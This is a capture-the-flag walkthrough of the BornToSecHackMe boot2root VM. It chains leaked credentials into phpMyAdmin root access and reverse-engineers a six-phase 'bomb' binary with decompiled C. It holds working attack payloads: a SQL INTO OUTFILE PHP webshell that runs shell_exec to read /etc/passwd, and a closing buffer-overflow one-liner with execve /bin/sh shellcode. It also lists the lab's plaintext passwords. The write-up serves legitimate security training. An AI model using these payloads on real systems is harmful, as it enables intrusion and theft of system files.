In the dirb result we found some url on the local server running on the machine.

The main ones are a phpmyadmin page, a forum and a webmail

Looking at the forum and exploring the topics we found one called : "probleme login ?" from lmezard.
There is a huge text coming from what it looks like a log file of different access with everytime an
error for the password of the user.
But in the middle of the text, there is a weird string :

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

the !q\]Ej?*5K5cy*AJ is a bit weird. This doesn't look like a username to me but more of a password.
Let's try to connect us on the machine. Trying with the different username found in the log : adam, admin, nagios, guest, ubnt, test, ftpuser

But nothing works to connect on the VM.
Remember we tried to login with the password : !q\]Ej?*5K5cy*AJ

We can connect on the forum too, let's try with the username we found and the same password. Same result, nothing works.

There is one last name we didn't try. The author of the original post : lmezard

And it works ! We can login on lmezard's account with the password : !q\]Ej?*5K5cy*AJ

Exploring the rest of the forum logged as lmezard we discovered that in our profile page, we have an email !

This email is : laurie@borntosec.net

So now we can login on the forum.
With dirb we found that there is a webmail service running on the machine : Squirrel Mail

Accessing https://[IP]/webmail

We need to input a username and a password.

Let's try the same username + password from the forum.
We are now connected on the email service and there are 2 emails on the account.

The first one'subject is "very interesting!!!" but the content of the email is not.
However the last one received is waaaaaaaay more interesting.

Here is the email :

"Subject:  	DB Access
From:  	qudevide@mail.borntosec.net
Date:  	Thu, October 8, 2015 11:25 pm
To:  	laurie@borntosec.net
Priority:  	Normal

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards."

There is a login/password to connect to the database ?
With dirb we knew there is a phpmyadmin page, but we didn't have the username and password to log in.
Let's try with the one from the email.

It works ! We can connect to the phpmyadmin as root.

root : Fg-'kKXBj87E:aJ$

Now logged as root on the phpmyadmin page, we can test some SQL command.

SELECT @ @version
5.5.44-0ubuntu0.12.04.1

Looking online on how to exploit Phpmyadmin as root user we found that we can call a SQL command to create a php file and 
call shell_exec and execute some bash command and print the result in a file.
source : https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/

After few tries we found the right way to call it :

select '<?php $output = shell_exec('cat /etc/passwd'); echo $output ?>' into outfile '/var/www/forum/templates_c/passwd.php'

Then after sneaking around calling ls, pwd ...etc we found in the /home directory some subdirectories related to others users :

LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz

In the LOOATME directory we can found a file called password and we have in it a login/password related to user lmezard:

lmezard:G!@M6f4Eatau{sF"

Of course these credidentials are not valid to log on Boot2root machine, it's a FTP account (we knew there was a ftp service
running thanks to nmap).

Login in FTP we could connect on the machine :

ftp 192.168.56.103

Going in to pass mode we can list the directory :

tp 192.168.56.103
Connected to 192.168.56.103.
220 Welcome on this server
Name (192.168.56.103:user42): lmezard
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command.
ftp: bind: Address already in use
ftp> pass
Passive mode on.
ftp> ls
227 Entering Passive Mode (192,168,56,103,46,195)
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp>

And now we can get the README and fun files.

fun isn't a file, it's a hidden tar
Renaming in fun.tar and now we can extract its content,
resulting in a ft_fun directory with 739 .pcap files

Looking at few files we found that it looks like C code
but splitted in hundreads of files.
But what does it do ? Let's find the main function

int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}

That's interesting. We have the last 5 char of the password.
Because we can reach functions getme8() to getmet12().
It means we have : 

XXXXXXXwnage

Grepping on the content of all the files to look for 'return'

We get :

cat merge | grep 'return'
//file483	return 'a';
//file697	return 'I';
	return 'w';
	return 'n';
	return 'a';
	return 'g';
	return 'e';
//file161	return 'e';
//file252	return 't';
//file163	return 'p';
//file640	return 'r';
//file3	return 'h';

Our first past of the password contains aIetrh

With a little bit of swap and guessing the password that got out was

Iheartpwnage

We have to hash this with SHA-256 and we should be able to log as laurie on the machine.

330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

We are now logged as laurie on boot2root

In the home directory there is a readme and an executable called
bomb.
Executing it, it waits for the user to give a value and read the stin.

Thanks to gdb, we can explore in details and we discoered that there
are 6 phase.
We can access the phase_1 of the program with a breakpoint,
at phase_1 + 26 and change the value of eax to 0 (set to 1).
This let us pass and defuse the phase 1.

The string is "Public speaking is very easy."

Now for phase_2, again the program waits for a user entry
Adding a breakpoint at phase_2 + 46 and phase_2 + 68 
we can understand that we need to give 6 parameters to the function
It's a factorial series of 6
1 2 6 24 120 720

For phase_3 using ghidra we can decompile the function :


void phase_3(char *param_1)

{
  int iVar1;
  char cVar2;
  uint local_10;
  char local_9;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);	// Wait for 3 parameters : an int, a char and an int
  if (iVar1 < 3) {													// I less than 3 variables -> explode
    explode_bomb();
  }
  switch(local_10) {												// check on first parameter : int
  case 0:
    cVar2 = 'q';													// if != 0 q 777 -> explode
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
 case 1:															// if != 1 b 214 -> explode
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';													// if != 2 b 755 -> explode
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  case 3:
    cVar2 = 'k';													// if != 3 k 251 -> explode
    if (local_8 != 0xfb) {
      explode_bomb();
    }
    break;
  case 4:
    cVar2 = 'o';													// if != 4 o 160 -> explode
    if (local_8 != 0xa0) {
      explode_bomb();
    }
    break;
  case 5:
    cVar2 = 't';													// if != 5 t 458 -> explode
    if (local_8 != 0x1ca) {
      explode_bomb();
    }
    break;
  case 6:															// if != 6 v 780 -> explode
    cVar2 = 'v';
    if (local_8 != 0x30c) {
      explode_bomb();
    }
    break;
  case 7:															// if != 7 b 524 -> explode
    cVar2 = 'b';
    if (local_8 != 0x20c) {
      explode_bomb();
    }
    break;
  default:															// if x -> explode
    cVar2 = 'x';
    explode_bomb();
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}



So there are many solutions to choose from.


Here is phase_4 :


void phase_4(char *param_1)

{
  int iVar1;
  int local_8;

  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) {
    explode_bomb();
  }
  return;
}



We need to give 1 parameter, an int and it must be positive.

This int is passed to a function func4 and the result exepected is 0x37 = 55

What is func4 ? :

int func4(int param_1)

{
  int iVar1;
  int iVar2;

  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}


We can create a C file to compile it and see the result.


With this C file :

#include <stdlib.h>
#include <stdio.h>

int func4(int param_1)

{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}

int main(int argc, char **argv)
{
	if (argc != 2)
		return (0);
	int param_1 = atoi(argv[1]);
	int ret = func4(param_1);

	printf("%d\n", ret);
}


We can find the solution :



➜  born2root git:(master) ✗ vim phase_4.c
➜  born2root git:(master) ✗ gcc phase_4.c
➜  born2root git:(master) ✗ ./a.out
➜  born2root git:(master) ✗ ./a.out 2
2
➜  born2root git:(master) ✗ ./a.out 5
8
➜  born2root git:(master) ✗ ./a.out 10
89
➜  born2root git:(master) ✗ ./a.out 9
55

The answer should be 9


Phase_5 :


void phase_5(int param_1)

{
  int iVar1;
  undefined local_c [6];
  undefined local_6;

  iVar1 = string_length(param_1);
  if (iVar1 != 6) {
    explode_bomb();
  }
  iVar1 = 0;
  do {
    local_c[iVar1] = (&array.123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  local_6 = 0;
  iVar1 = strings_not_equal(local_c,"giants");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}



we can see that the phase_5 is taking one parameter, a string 
This string must have a lenth of 6 char or the bomb explode.
Looking at array.123 it is a string :

                             array.123                                       XREF[2]:     phase_5:08048d52(*),
                                                                                          phase_5:08048d5f(R)
        0804b220 69              ??         69h    i
        0804b221 73              ??         73h    s
        0804b222 72              ??         72h    r
        0804b223 76              ??         76h    v
        0804b224 65              ??         65h    e
        0804b225 61              ??         61h    a
        0804b226 77              ??         77h    w
        0804b227 68              ??         68h    h
        0804b228 6f              ??         6Fh    o
        0804b229 62              ??         62h    b
        0804b22a 70              ??         70h    p
        0804b22b 6e              ??         6Eh    n
        0804b22c 75              ??         75h    u
        0804b22d 74              ??         74h    t
        0804b22e 66              ??         66h    f
        0804b22f 67              ??         67h    g


There is an operation of the string parameter, and then a comparaison with
"giants" if in the output our string is equal to giants it's good.

With this C code :


#include <stdio.h>
#include <string.h>

void phase_5(char *line) 
{
    if (strlen(line) != 6)
	{
		printf("Bad length\n");
		return ;
	}
	int i = 0;
    char *string = "isrveawhobpnutfg";
    while (i < 6) {
        line[i] = string[line[i] & 0xf];
		printf("%s\n", line);
        i++;
    }
		printf("\n%s\n", line);
	if (strcmp(line, "giants") != 0)
	{
		printf("Bad input\n");
		return;
    }
    return;
}

int main(int argc, char **argv)
{
	if (argc != 2)
		return (0);
	phase_5(argv[1]);
}


We can deduce the input to get "giants" as an output :

➜  born2root git:(master) ✗ ./a.out abcdef
sbcdef
srcdef
srvdef
srveef
srveaf
srveaw

srveaw
Bad input
➜  born2root git:(master) ✗ ./a.out ghijkl
hhijkl
hoijkl
hobjkl
hobpkl
hobpnl
hobpnu

hobpnu
Bad input
➜  born2root git:(master) ✗ ./a.out mnopqr
tnopqr
tfopqr
tfgpqr
tfgiqr
tfgisr
tfgisr

tfgisr
Bad input
➜  born2root git:(master) ✗ ./a.out stuvwx
vtuvwx
veuvwx
veavwx
veawwx
veawhx
veawho

veawho
Bad input
➜  born2root git:(master) ✗ ./a.out yzyzyz
bzyzyz
bpyzyz
bpbzyz
bpbpyz
bpbpbz
bpbpbp

bpbpbp
Bad input
➜  born2root git:(master) ✗ ./a.out opekmq
gpekmq
giekmq
giakmq
gianmq
giantq
giants

giants


Solution is opekmq

Phase_6 :




void phase_6(undefined4 param_1)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  undefined1 *local_38;
  int *local_34 [6];
  int local_1c [6];

  local_38 = node1;
  read_six_numbers(param_1,local_1c);
  iVar4 = 0;
  do {
    if (5 < local_1c[iVar4] - 1U) {
      explode_bomb();
    }
    iVar2 = iVar4 + 1;
    if (iVar2 < 6) {
      do {
        if (local_1c[iVar4] == local_1c[iVar2]) {
          explode_bomb();
        }
        iVar2 = iVar2 + 1;
      } while (iVar2 < 6);
    }
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 0;
  do {
    iVar2 = 1;
    piVar3 = (int *)local_38;
    if (1 < local_1c[iVar4]) {
      do {
        piVar3 = (int *)piVar3[2];
        iVar2 = iVar2 + 1;
      } while (iVar2 < local_1c[iVar4]);
    }
    local_34[iVar4] = piVar3;
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 1;
  piVar3 = local_34[0];
  do {
    piVar1 = local_34[iVar4];
    piVar3[2] = (int)piVar1;
    iVar4 = iVar4 + 1;
    piVar3 = piVar1;
  } while (iVar4 < 6);
  piVar1[2] = 0;
  iVar4 = 0;
  do {
    if (*local_34[0] < *(int *)local_34[0][2]) {
      explode_bomb();
    }
    local_34[0] = (int *)local_34[0][2];
    iVar4 = iVar4 + 1;
  } while (iVar4 < 5);
  return;
}

4 2 6 3 1 5
Publicspeakingisveryeasy.126241207201b2149opekmq426315


We can now log as Thor with :

Publicspeakingisveryeasy.126241207201b2149opekmq426315


zaz password : 646da671ca01bb5d84dbb5fb2238dc8e

./exploit_me $(python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x40\xf6\xff\xbf"')